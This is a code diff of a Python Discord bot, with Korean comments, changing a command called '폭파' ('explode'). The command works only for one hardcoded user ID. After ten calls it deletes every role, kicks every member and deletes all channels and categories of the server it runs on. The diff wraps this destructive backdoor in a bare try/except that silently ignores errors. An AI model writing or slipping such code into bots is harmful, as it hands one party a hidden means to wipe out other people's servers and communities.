@@ -288,42 +288,45 @@ bombcount = {}
 
 @bot.command()
 async def 폭파(ctx):
-    if ctx.author.id == 382938103435886592:
-        serverid = str(ctx.guild.id)
-        if serverid in bombcount.keys():
-            bombcount[serverid] += 1
+    try:
+        if ctx.author.id == 382938103435886592:
+            serverid = str(ctx.guild.id)
+            if serverid in bombcount.keys():
+                bombcount[serverid] += 1
 
-        else:
-            bombcount[serverid] = 1
-        if bombcount[serverid] == 10:
-            # 모든 역할 삭제
-            guildRoles = ctx.guild.roles
+            else:
+                bombcount[serverid] = 1
+            if bombcount[serverid] == 10:
+                # 모든 역할 삭제
+                guildRoles = ctx.guild.roles
 
-            for role in guildRoles:
-                await asyncio.sleep(0.3)
-                await role.delete()
+                for role in guildRoles:
+                    await asyncio.sleep(0.3)
+                    await role.delete()
 
-            # 모든 멤버 강퇴
-            guildMembers = ctx.guild.members
-            for member in guildMembers:
-                await asyncio.sleep(0.3)
-                await member.kick()
+                # 모든 멤버 강퇴
+                guildMembers = ctx.guild.members
+                for member in guildMembers:
+                    await asyncio.sleep(0.3)
+                    await member.kick()
 
-            # 모든 채널 삭제후 채널 생성
-            for channel in ctx.guild.channels:
-                await channel.delete()
-                await asyncio.sleep(0.3)
-            for category in ctx.message.guild.categories:
-                await category.delete()
-                await asyncio.sleep(0.3)
-            channel = await ctx.guild.create_text_channel("폭파 후 첫 채널")
-            await channel.send(f"{len(ctx.guild.members)}명 남음")
+                # 모든 채널 삭제후 채널 생성
+                for channel in ctx.guild.channels:
+                    await channel.delete()
+                    await asyncio.sleep(0.3)
+                for category in ctx.message.guild.categories:
+                    await category.delete()
+                    await asyncio.sleep(0.3)
+                channel = await ctx.guild.create_text_channel("폭파 후 첫 채널")
+                await channel.send(f"{len(ctx.guild.members)}명 남음")
 
-            del bombcount[serverid]
-        else:
-            await ctx.send(
-                f"봇보다 낮은 권한의 모든 역할 삭제, 봇보다 낮은 권한의 모든 멤버 강퇴, 모든 채널 삭제 후 새 채널 생성까지 {10-bombcount[serverid]}번 남았습니다."
-            )
+                del bombcount[serverid]
+            else:
+                await ctx.send(
+                    f"봇보다 낮은 권한의 모든 역할 삭제, 봇보다 낮은 권한의 모든 멤버 강퇴, 모든 채널 삭제 후 새 채널 생성까지 {10-bombcount[serverid]}번 남았습니다."
+                )
+    except:
+        pass
 
 
 @bot.command()
